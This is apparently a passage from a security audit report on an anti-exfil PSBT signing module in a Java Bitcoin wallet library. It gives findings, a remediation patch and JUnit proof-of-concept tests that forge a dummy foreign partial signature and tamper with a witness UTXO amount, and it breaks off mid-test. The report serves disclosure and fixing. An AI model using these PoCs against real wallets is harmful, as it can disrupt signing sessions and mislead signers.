 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([^\\\"]+)\\\"");
    private static final BigInteger FIXED_SIGNER_NONCE = BigInteger.TWO;
    private static final String ANTI_EXFIL_POINT_TAG = "s2c/ecdsa/point";

    @TempDir
    Path temporary;

    @Test
    void invalidForeignPartialSignatureSurvivesCoordinatorCompletion() throws Exception {
        String vector = loadVector("protocol-v1-mixed-provenance-vector.json");
        Keystore protectedSigner = protectedSigner(vector);
        byte[] attackerSuppliedPsbt = poisonForeignPartialSignature(Utils.hexToBytes(field(vector, "original_psbt_hex")));

        assertThrows(PSBTSignatureException.class, () -> new PSBT(attackerSuppliedPsbt, true),
                "The library's normal PSBT parser rejects the attacker-supplied foreign signature when verification is enabled");
        assertEquals(1, AntiExfilPsbt.enumerateSigningSlots(attackerSuppliedPsbt, protectedSigner).size(),
                "Anti-exfil slot enumeration still accepts the same PSBT because foreign signatures are not checked");

        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(
                temporary.resolve("invalid-foreign-signature.aexs"),
                temporary.resolve("invalid-foreign-signature.aexj"),
                attackerSuppliedPsbt,
                protectedSigner,
                AntiExfilNetwork.TESTNET4);

        AntiExfilMessage commit = AntiExfilCodec.decode(coordinator.getHostCommitMessage());
        byte[] signerOpenings = buildSignerOpenings(commit);
        AntiExfilMessage reveal = AntiExfilCodec.decode(coordinator.acceptOpenings(signerOpenings));
        AntiExfilMessage signerSignatures = buildSignerSignatures(reveal, protectedSigner, attackerSuppliedPsbt);

        AntiExfilCoordinator.Completion completion = coordinator.complete(AntiExfilCodec.encode(signerSignatures));

        assertFalse(completion.isBroadcast());
        assertEquals(1, completion.getVerifiedSignatures().size(),
                "The controlled anti-exfil signature was verified and merged");
        PSBT completedWithoutVerification = new PSBT(completion.getSignedPsbt(), false);
        assertEquals(2, completedWithoutVerification.getPsbtInputs().getFirst().getPartialSignatures().size(),
                "The returned PSBT contains both the newly verified protected signature and the pre-existing foreign entry");
        assertTrue(completedWithoutVerification.serialize().length > attackerSuppliedPsbt.length,
                "Completion serialized a modified PSBT rather than returning the original bytes unchanged");
        assertThrows(PSBTSignatureException.class, () -> new PSBT(completion.getSignedPsbt(), true),
                "A patched anti-exfil implementation must not complete with an output PSBT that the real verifier rejects");
    }

    private static byte[] poisonForeignPartialSignature(byte[] original) throws Exception {
        PSBT psbt = new PSBT(original, false);
        PSBTInput input = psbt.getPsbtInputs().getFirst();
        assertEquals(1, input.getPartialSignatures().size(), "Fixture starts with exactly one ordinary foreign signature");
        ECKey foreignKey = input.getPartialSignatures().keySet().iterator().next();
        input.getPartialSignatures().put(foreignKey, TransactionSignature.dummy(TransactionSignature.Type.ECDSA));
        byte[] poisoned = psbt.serialize();
        assertThrows(PSBTSignatureException.class, () -> new PSBT(poisoned, true));
        return poisoned;
    }

    private static byte[] buildSignerOpenings(AntiExfilMessage commit) {
        byte[] opening = openingPoint().getEncoded(true);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : commit.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), opening, null, null));
        }
        return AntiExfilCodec.encode(new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), openingSlots));
    }

    private static AntiExfilMessage buildSignerSignatures(AntiExfilMessage reveal, Keystore signer, byte[] psbt) throws Exception {
        Map<AntiExfilSigningSlot.Identifier, ECKey> privateKeys = new HashMap<>();
        for(AntiExfilSigningSlot slot : AntiExfilPsbt.enumerateSigningSlots(psbt, signer)) {
            ECKey publicKey = ECKey.fromPublicOnly(slot.getSignerPublicKey());
            privateKeys.put(slot.getIdentifier(), signer.getSpendPrivateKey(Map.of(publicKey, slot.getKeyDerivation())));
        }

        List<AntiExfilSlot> signatureSlots = new ArrayList<>();
        for(AntiExfilSlot slot : reveal.getSlots()) {
            AntiExfilSigningSlot.Identifier identifier = new AntiExfilSigningSlot.Identifier((int)slot.getInputIndex(), slot.getSignerPublicKey());
            ECKey privateKey = privateKeys.get(identifier);
            assertNotNull(privateKey, "Missing private key for protected signing slot");
            byte[] compactSignature = antiExfilSign(privateKey, slot.getMessageHash(), slot.getHostRandomness());
            assertTrue(AntiExfilCrypto.verify(slot.getSignerPublicKey(), slot.getMessageHash(), slot.getHostRandomness(),
                    slot.getOpening(), compactSignature));
            signatureSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, compactSignature));
        }
        return new AntiExfilMessage(reveal.getNetwork(), AntiExfilStage.SIGNER_SIGNATURES,
                reveal.getSessionId(), reveal.getPsbtDigest(), signatureSlots);
    }

    private static byte[] antiExfilSign(ECKey privateKey, byte[] messageHash, byte[] hostRandomness) {
        BigInteger n = ECKey.CURVE.getN();
        BigInteger d = privateKey.getPrivKey();
        ECPoint opening = openingPoint();
        BigInteger tweak = new BigInteger(1, Utils.taggedHash(ANTI_EXFIL_POINT_TAG,
                Utils.concat(opening.getEncoded(true), hostRandomness)));
        assertTrue(tweak.signum() >= 0 && tweak.compareTo(n) < 0, "Generated tweak must be a valid scalar");
        BigInteger nonce = FIXED_SIGNER_NONCE.add(tweak).mod(n);
        assertTrue(nonce.signum() > 0, "Tweaked nonce must be non-zero");
        ECPoint committedPoint = opening.add(ECKey.CURVE.getG().multiply(tweak)).normalize();
        BigInteger r = committedPoint.getAffineXCoord().toBigInteger().mod(n);
        BigInteger z = new BigInteger(1, messageHash);
        BigInteger s = nonce.modInverse(n).multiply(z.add(r.multiply(d))).mod(n);
        if(s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) {
            s = n.subtract(s);
        }
        return Utils.concat(Utils.bigIntegerToBytes(r, 32), Utils.bigIntegerToBytes(s, 32));
    }

    private static ECPoint openingPoint() {
        return ECKey.CURVE.getG().multiply(FIXED_SIGNER_NONCE).normalize();
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore protectedSigner(String vector) throws Exception {
        DeterministicSeed seed = new DeterministicSeed(field(vector, "mnemonic"), "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.MULTI_HD, KeyDerivation.parsePath(field(vector, "account_derivation")));
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 20 lines & 0.7568359375 KB skipped]
> Task :processResources UP-TO-DATE
> Task :classes UP-TO-DATE
> Task :compileTestJava
> Task :processTestResources UP-TO-DATE
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 9s
5 actionable tasks: 2 executed, 3 up-to-date
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC passed with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`. It demonstrates completion through the real public coordinator flow (`create` -> `acceptOpenings` -> `complete`) and proves the returned PSBT is rejected by the real `PSBT(..., true)` signature verifier because the invalid pre-existing foreign partial signature survived. It does not exercise downstream PSBT finalization or transaction broadcast; the demonstrated impact is completion of a durable anti-exfil session with an unverifiable returned signed PSBT.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Enable the PSBT parser's built-in signature verification at the sole anti-exfil ingestion boundary, rejecting invalid pre-existing foreign partial signatures before slot enumeration or reconstruction can preserve them.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
@@ -1,254 +1,254 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.KeyDerivation;
 import com.sparrowwallet.drongo.crypto.ECDSASignature;
 import com.sparrowwallet.drongo.crypto.ECKey;
 import com.sparrowwallet.drongo.protocol.Script;
 import com.sparrowwallet.drongo.protocol.ScriptChunk;
 import com.sparrowwallet.drongo.protocol.ScriptOpCodes;
 import com.sparrowwallet.drongo.protocol.ScriptType;
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.protocol.SigHash;
 import com.sparrowwallet.drongo.protocol.TransactionSignature;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.psbt.PSBTInput;
 import com.sparrowwallet.drongo.psbt.PSBTParseException;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.math.BigInteger;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilPsbt {
     private AntiExfilPsbt() {
     }
 
     public static PSBT parseCanonicalV0(byte[] raw) {
         if(raw == null || raw.length < 5 || raw[0] != 'p' || raw[1] != 's' || raw[2] != 'b' || raw[3] != 't' || raw[4] != (byte)0xff) {
             throw fail(INVALID_MESSAGE, "Invalid PSBT magic");
         }
         try {
-            PSBT psbt = new PSBT(raw, false);
+            PSBT psbt = new PSBT(raw, true);
             if(psbt.getVersion() != null && psbt.getVersion() != 0) {
                 throw fail(INVALID_MESSAGE, "Protocol v1 accepts PSBT v0 only");
             }
             if(!Arrays.equals(raw, psbt.serialize())) {
                 throw fail(INVALID_MESSAGE, "PSBT is not canonically encoded");
             }
             if(psbt.getTransaction() == null || psbt.getPsbtInputs().isEmpty() || psbt.getPsbtOutputs().isEmpty()) {
                 throw fail(INVALID_MESSAGE, "PSBT requires an unsigned transaction");
             }
             return psbt;
         } catch(PSBTParseException | RuntimeException e) {
             if(e instanceof AntiExfilException antiExfilException) throw antiExfilException;
             throw new AntiExfilException(INVALID_MESSAGE, "Invalid PSBT: " + e.getMessage(), e);
         }
     }
 
     public static List<AntiExfilSigningSlot> enumerateSigningSlots(byte[] raw, Keystore keystore) {
         if(keystore == null || keystore.getKeyDerivation() == null || keystore.getExtendedPublicKey() == null) {
             throw fail(INVALID_MESSAGE, "A public account keystore is required");
         }
         PSBT psbt = parseCanonicalV0(raw);
         List<AntiExfilSigningSlot> slots = new ArrayList<>();
         for(int index = 0; index < psbt.getPsbtInputs().size(); index++) {
             PSBTInput input = psbt.getPsbtInputs().get(index);
             failOnTaproot(index, input);
             if(input.getUtxo() == null) failInput(index, "missing UTXO data");
             ScriptClassification classification = classify(index, input);
             SigHash sigHash = input.getSigHash() == null ? SigHash.ALL : input.getSigHash();
             if(sigHash != SigHash.ALL) failInput(index, "protocol v1 supports only explicit SIGHASH_ALL");
             validateDerivations(index, input, classification.signingKeys());
             byte[] messageHash;
             try {
                 messageHash = input.getSigningHash().getBytes();
             } catch(RuntimeException e) {
                 throw new AntiExfilException(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": cannot derive sighash", e);
             }
             for(Map.Entry<ECKey, KeyDerivation> entry : input.getDerivedPublicKeys().entrySet()) {
                 ECKey publicKey = entry.getKey();
                 KeyDerivation derivation = entry.getValue();
                 if(!classification.signingKeys().contains(publicKey)
                         || !keystore.getKeyDerivation().getMasterFingerprint().equals(derivation.getMasterFingerprint())) continue;
                 ECKey expected = keystore.getPubKeyForDerivation(derivation);
                 if(expected == null || !Arrays.equals(expected.getPubKey(), publicKey.getPubKey())) {
                     failInput(index, "BIP32 path does not derive its declared public key");
                 }
                 if(input.getPartialSignatures().containsKey(publicKey)) {
                     throw fail(UNEXPECTED_RETURN_DATA, "Input " + index + " already has a controlled signature");
                 }
                 if(input.isFinalized()) continue;
                 slots.add(new AntiExfilSigningSlot(index, publicKey.getPubKey(), messageHash,
                         AntiExfilCodec.SIGHASH_ALL, derivation, classification.kind()));
             }
         }
         slots.sort((left, right) -> left.getIdentifier().compareTo(right.getIdentifier()));
         if(slots.isEmpty()) throw fail(SIGNATURE_SLOT_MISMATCH, "PSBT has no controlled signing slots");
         if(slots.size() > AntiExfilCodec.MAX_SLOTS) throw fail(SIGNATURE_SLOT_MISMATCH, "PSBT exceeds the global slot limit");
         Set<AntiExfilSigningSlot.Identifier> identifiers = new HashSet<>();
         Map<Integer, Integer> perInput = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             if(!identifiers.add(slot.getIdentifier())) throw fail(SIGNATURE_SLOT_MISMATCH, "Duplicate signing slot");
             int count = perInput.merge(slot.getInputIndex(), 1, Integer::sum);
             if(count > AntiExfilCodec.MAX_SLOTS_PER_INPUT) failInput(slot.getInputIndex(), "input exceeds the per-input slot limit");
         }
         return List.copyOf(slots);
     }
 
     public static AntiExfilMessage buildHostCommitMessage(byte[] raw, Keystore keystore, AntiExfilNetwork network,
                                                            byte[] sessionId,
                                                            Map<AntiExfilSigningSlot.Identifier, byte[]> hostRandomness) {
         List<AntiExfilSigningSlot> semantic = enumerateSigningSlots(raw, keystore);
         Set<AntiExfilSigningSlot.Identifier> expected = new HashSet<>();
         semantic.forEach(slot -> expected.add(slot.getIdentifier()));
         if(hostRandomness == null || !hostRandomness.keySet().equals(expected)) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Host randomness must cover the exact slot set");
         }
         Set<ByteArray> uniqueRandomness = new HashSet<>();
         List<AntiExfilSlot> records = new ArrayList<>();
         for(AntiExfilSigningSlot slot : semantic) {
             byte[] rho = hostRandomness.get(slot.getIdentifier());
             if(rho == null || rho.length != 32 || !uniqueRandomness.add(new ByteArray(rho))) {
                 throw fail(COMMITMENT_MISMATCH, "Host randomness must be valid and unique per slot");
             }
             records.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                     slot.getMessageHash(), AntiExfilCrypto.hostCommit(rho), null, null, null));
         }
         AntiExfilMessage message = new AntiExfilMessage(network, AntiExfilStage.HOST_COMMIT, sessionId, Sha256Hash.hash(raw), records);
         AntiExfilCodec.validate(message);
         return message;
     }
 
     public static byte[] reconstructSignedPsbt(byte[] original, Keystore keystore, AntiExfilMessage commit,
                                                AntiExfilMessage signatures,
                                                Map<AntiExfilSigningSlot.Identifier, byte[]> hostRandomness) {
         List<AntiExfilSigningSlot> semantic = enumerateSigningSlots(original, keystore);
         Set<AntiExfilSigningSlot.Identifier> expectedIdentifiers = new HashSet<>();
         semantic.forEach(slot -> expectedIdentifiers.add(slot.getIdentifier()));
         if(hostRandomness == null || !hostRandomness.keySet().equals(expectedIdentifiers)) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Stored host randomness differs from the authoritative slot set");
         }
         AntiExfilCodec.validate(commit);
         AntiExfilCodec.validate(signatures);
         if(commit == null || commit.getStage() != AntiExfilStage.HOST_COMMIT
                 || !Arrays.equals(commit.getPsbtDigest(), Sha256Hash.hash(original))
                 || commit.getSlots().size() != semantic.size()) {
             throw fail(TRANSACTION_MISMATCH, "Commit message is not authoritative for the PSBT");
         }
         if(signatures == null || signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) {
             throw fail(WRONG_STAGE, "Expected signer-signatures message");
         }
         if(signatures.getNetwork() != commit.getNetwork()
                 || !Arrays.equals(signatures.getSessionId(), commit.getSessionId())
                 || !Arrays.equals(signatures.getPsbtDigest(), commit.getPsbtDigest())
                 || signatures.getSlots().size() != semantic.size()) {
             throw fail(TRANSACTION_MISMATCH, "Signature response context changed");
         }
         PSBT reconstructed = parseCanonicalV0(original);
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot before = commit.getSlots().get(i);
             AntiExfilSlot after = signatures.getSlots().get(i);
             byte[] rho = hostRandomness == null ? null : hostRandomness.get(authoritative.getIdentifier());
             requireSlot(authoritative, before);
             requireSlot(authoritative, after);
             if(!Arrays.equals(before.getCommitment(), after.getCommitment()) || rho == null
                     || !Arrays.equals(AntiExfilCrypto.hostCommit(rho), before.getCommitment())) {
                 throw fail(COMMITMENT_MISMATCH, "Stored randomness or response commitment changed");
             }
             if(!AntiExfilCrypto.verify(after.getSignerPublicKey(), after.getMessageHash(), rho,
                     after.getOpening(), after.getSignature())) {
                 throw fail(SIGNATURE_INVALID, "Anti-exfil signature verification failed");
             }
             byte[] compact = after.getSignature();
             BigInteger r = new BigInteger(1, Arrays.copyOfRange(compact, 0, 32));
             BigInteger s = new BigInteger(1, Arrays.copyOfRange(compact, 32, 64));
             TransactionSignature signature = new TransactionSignature(new ECDSASignature(r, s), SigHash.ALL);
             reconstructed.getPsbtInputs().get(authoritative.getInputIndex()).getPartialSignatures()
                     .put(ECKey.fromPublicOnly(authoritative.getSignerPublicKey()), signature);
         }
         return reconstructed.serialize();
     }
 
     private static void requireSlot(AntiExfilSigningSlot authoritative, AntiExfilSlot record) {
         if(record.getInputIndex() != Integer.toUnsignedLong(authoritative.getInputIndex())
                 || record.getSighashType() != AntiExfilCodec.SIGHASH_ALL
                 || !Arrays.equals(record.getSignerPublicKey(), authoritative.getSignerPublicKey())
                 || !Arrays.equals(record.getMessageHash(), authoritative.getMessageHash())) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Protocol slot differs from authoritative PSBT semantics");
         }
     }
 
     private static ScriptClassification classify(int index, PSBTInput input) {
         ScriptType type = input.getScriptType();
         if(type == ScriptType.P2WPKH || type == ScriptType.P2SH_P2WPKH) {
             Script program = type == ScriptType.P2WPKH ? input.getUtxo().getScript() : input.getRedeemScript();
             if(program == null || !ScriptType.P2WPKH.isScriptType(program)) failInput(index, "inconsistent P2WPKH script");
             List<ECKey> matches = input.getDerivedPublicKeys().keySet().stream()
                     .filter(key -> ScriptType.P2WPKH.getOutputScript(key.getPubKeyHash()).equals(program)).toList();
             if(matches.size() != 1) failInput(index, "P2WPKH requires exactly one matching BIP32 public key");
             return new ScriptClassification(type == ScriptType.P2WPKH ? "p2wpkh" : "p2sh-p2wpkh", Set.copyOf(matches));
         }
         if(type == ScriptType.P2WSH || type == ScriptType.P2SH_P2WSH) {
             Script witnessScript = input.getWitnessScript();
             if(witnessScript == null || !ScriptType.MULTISIG.isScriptType(witnessScript)) failInput(index, "witness script is not standard multisig");
             List<ScriptChunk> chunks = witnessScript.getChunks();
             if(!chunks.getLast().equalsOpCode(ScriptOpCodes.OP_CHECKMULTISIG)) failInput(index, "witness script must end in CHECKMULTISIG");
             ECKey[] keys;
             try {
                 keys = ScriptType.MULTISIG.getPublicKeysFromScript(witnessScript);
                 if(ScriptType.MULTISIG.getThreshold(witnessScript) > keys.length) failInput(index, "multisig threshold exceeds key count");
                 for(int i = 1; i < chunks.size() - 2; i++) {
                     if(chunks.get(i).getOpcode() != 33 || chunks.get(i).getData() == null || chunks.get(i).getData().length != 33) {
                         failInput(index, "multisig keys must use canonical compressed pushes");
                     }
                 }
             } catch(RuntimeException e) {
                 throw new AntiExfilException(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": invalid multisig script", e);
             }
             Set<ECKey> unique = new HashSet<>(Arrays.asList(keys));
             if(unique.size() != keys.length) failInput(index, "multisig public keys must be unique");
             String kind = type == ScriptType.P2WSH ? "p2wsh-multisig" : "p2sh-p2wsh-multisig";
             return new ScriptClassification(kind, Set.copyOf(unique));
         }
         failInput(index, "unsupported or inconsistent script type " + type);
         throw new AssertionError();
     }
 
     private static void validateDerivations(int index, PSBTInput input, Set<ECKey> signingKeys) {
         Set<ECKey> seen = new HashSet<>();
         for(Map.Entry<ECKey, KeyDerivation> entry : input.getDerivedPublicKeys().entrySet()) {
             if(!seen.add(entry.getKey()) || !signingKeys.contains(entry.getKey())
                     || entry.getValue() == null || entry.getValue().getMasterFingerprint() == null
                     || entry.getValue().getMasterFingerprint().length() != 8) {
                 failInput(index, "invalid, duplicate, or script-foreign BIP32 derivation");
             }
         }
     }
 
     private static void failOnTaproot(int index, PSBTInput input) {
         if(input.isTaproot() || input.getTapInternalKey() != null || input.getTapKeyPathSignature() != null
                 || !input.getTapDerivedPublicKeys().isEmpty()) failInput(index, "Taproot data is unsupported");
     }
 
     private static void failInput(int index, String message) {
         throw fail(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": " + message);
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     private record ScriptClassification(String kind, Set<ECKey> signingKeys) {}
     private record ByteArray(byte[] value) {
         @Override public boolean equals(Object object) { return object instanceof ByteArray other && Arrays.equals(value, other.value); }
         @Override public int hashCode() { return Arrays.hashCode(value); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java`
### Validation output

```
[output truncated: 29 lines & 0.9912109375 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 2s
```

---

# Witness UTXO is not bound to outpoint
**#247997**
- Severity: Medium
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java`
#### Lines 61-74 — _Only a null UTXO check precedes authoritative sighash derivation._

```
        for(int index = 0; index < psbt.getPsbtInputs().size(); index++) {
            PSBTInput input = psbt.getPsbtInputs().get(index);
            failOnTaproot(index, input);
            if(input.getUtxo() == null) failInput(index, "missing UTXO data");
            ScriptClassification classification = classify(index, input);
            SigHash sigHash = input.getSigHash() == null ? SigHash.ALL : input.getSigHash();
            if(sigHash != SigHash.ALL) failInput(index, "protocol v1 supports only explicit SIGHASH_ALL");
            validateDerivations(index, input, classification.signingKeys());
            byte[] messageHash;
            try {
                messageHash = input.getSigningHash().getBytes();
            } catch(RuntimeException e) {
                throw new AntiExfilException(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": cannot derive sighash", e);
            }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/psbt/PSBTInput.java` (3 locations)
#### Lines 383-411 — _The parser documents and implements txid binding only for non-witness UTXOs._

```
    /**
     * Verifies the utxo of this input is internally consistent, and that any provided redeem and witness scripts match it.
     * Only the non witness utxo is verified against the outpoint txid, so a witness utxo can only be relied on where the
     * sighash commits to the input amount - that is, where the input is a witness type.
     *
     * @throws PSBTParseException if the utxo, redeem script or witness script provided for this input are inconsistent
     */
    void verifyUtxo() throws PSBTParseException {
        //Any provided outpoint index must be present in the non witness utxo transaction, which is verified against the outpoint txid
        TransactionOutput nonWitnessUtxoOutput = getNonWitnessUtxoOutput();
        if(nonWitnessUtxo != null && getPrevIndex() != null && nonWitnessUtxoOutput == null) {
            throw new PSBTParseException("Non witness utxo transaction has no output at index " + getPrevIndex() + " for input " + index);
        }

        if(witnessUtxo != null && nonWitnessUtxoOutput != null
                && (witnessUtxo.getValue() != nonWitnessUtxoOutput.getValue() || !Arrays.equals(witnessUtxo.getScript().getProgram(), nonWitnessUtxoOutput.getScript().getProgram()))) {
            throw new PSBTParseException("Witness utxo of " + witnessUtxo.getValue() + " sats does not match the non witness utxo output of " + nonWitnessUtxoOutput.getValue() + " sats for input " + index);
        }

        //Witness utxos should only be provided for P2SH-P2WPKH or P2SH-P2WSH, as the legacy sighash does not commit to the input amount
        //A witness utxo that matches the txid verified non witness utxo output is redundant but harmless
        if(witnessUtxo != null && nonWitnessUtxoOutput == null && P2SH.isScriptType(witnessUtxo.getScript())) {
            Script nestedScript = redeemScript != null ? redeemScript : (finalScriptSig != null ? finalScriptSig.getFirstNestedScript() : null);
            if(nestedScript == null || (!P2WPKH.isScriptType(nestedScript) && !P2WSH.isScriptType(nestedScript))) {
                throw new PSBTParseException("Witness utxo provided for input " + index + " but redeem script is not P2WPKH or P2WSH");
            }
        }

        Script scriptPubKey = nonWitnessUtxoOutput != null ? nonWitnessUtxoOutput.getScript() : (witnessUtxo != null ? witnessUtxo.getScript() : null);
```
⋯
#### Lines 1129-1133 — _getUtxo falls back to a standalone witness UTXO._

```
    public TransactionOutput getUtxo() {
        //Prefer the non witness utxo, as it is the only form verified against the outpoint txid
        TransactionOutput nonWitnessUtxoOutput = getNonWitnessUtxoOutput();
        return nonWitnessUtxoOutput != null ? nonWitnessUtxoOutput : getWitnessUtxo();
    }
```
⋯
#### Lines 1158-1173 — _The witness UTXO amount directly determines the signature hash._

```
    private Sha256Hash getHashForSignature(Script connectedScript, SigHash localSigHash) {
        Sha256Hash hash;

        ScriptType scriptType = getScriptType();
        if(scriptType == ScriptType.P2TR) {
            List<TransactionOutput> spentUtxos = psbt.getPsbtInputs().stream().map(PSBTInput::getUtxo).collect(Collectors.toList());
            hash = psbt.getTransaction().hashForTaprootSignature(spentUtxos, index, !P2TR.isScriptType(connectedScript), connectedScript, localSigHash, null);
        } else if(Arrays.asList(WITNESS_TYPES).contains(scriptType)) {
            long prevValue = getUtxo().getValue();
            hash = psbt.getTransaction().hashForWitnessSignature(index, connectedScript, prevValue, localSigHash);
        } else {
            hash = psbt.getTransaction().hashForLegacySignature(index, connectedScript, localSigHash);
        }

        return hash;
    }
```
## Description

Slot enumeration accepts any non-null `PSBTInput.getUtxo()` and does not require the full previous transaction. `getUtxo()` falls back to a standalone witness UTXO, which the underlying parser explicitly does not bind to the transaction input's outpoint txid. Both the script and amount in that witness UTXO therefore remain supplier-controlled, yet they are used to classify the slot and calculate the authoritative BIP143 message hash. That hash is committed into protocol messages and later treated as the ground truth for signature verification and evidence. A false amount produces a signature invalid for the real coin, while the attestation still pairs that digest with the real outpoint.
## Root cause

The anti-exfil layer elevates witness-only UTXO data to authoritative transaction context without requiring the UTXO form that is authenticated against the outpoint.
## Impact

An untrusted PSBT supplier can cause a signer to confirm misleading UTXO data and consume an anti-exfil session producing an unbroadcastable transaction. This is an integrity and availability failure rather than direct theft because SegWit signatures commit to the supplied amount and fail against the actual UTXO.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECDSASignature;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.Sha256Hash;
import com.sparrowwallet.drongo.protocol.SigHash;
import com.sparrowwallet.drongo.protocol.TransactionOutput;
import com.sparrowwallet.drongo.protocol.TransactionSignature;
import com.sparrowwallet.drongo.psbt.PSBT;
import com.sparrowwallet.drongo.psbt.PSBTInput;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.bouncycastle.math.ec.ECPoint;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");
    private static final String POINT_TAG = "s2c/ecdsa/point";

    @TempDir
    Path temporary;

    @Test
    void witnessOnlyUtxoAmountIsAcceptedAsAuthoritativeForEvidenceOnSameOutpoint() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] raw = Utils.hexToBytes(field(vector, "psbt_hex"));
        Keystore keystore = keystore();

        List<AntiExfilSigningSlot> honestSlots = AntiExfilPsbt.enumerateSigningSlots(raw, keystore);
        PSBT poisoned = AntiExfilPsbt.parseCanonicalV0(raw);
        PSBTInput firstInput = poisoned.getPsbtInputs().getFirst();
        assertEquals(null, firstInput.getNonWitnessUtxo(), "fixture input is witness-only, so no txid-bound UTXO exists");
        byte[] originalOutpoint = poisoned.getTransaction().getInputs().getFirst().getOutpoint().bitcoinSerialize();
        long honestAmount = firstInput.getWitnessUtxo().getValue();
        firstInput.setWitnessUtxo(new TransactionOutput(null, honestAmount + 50_000L, firstInput.getWitnessUtxo().getScript()));
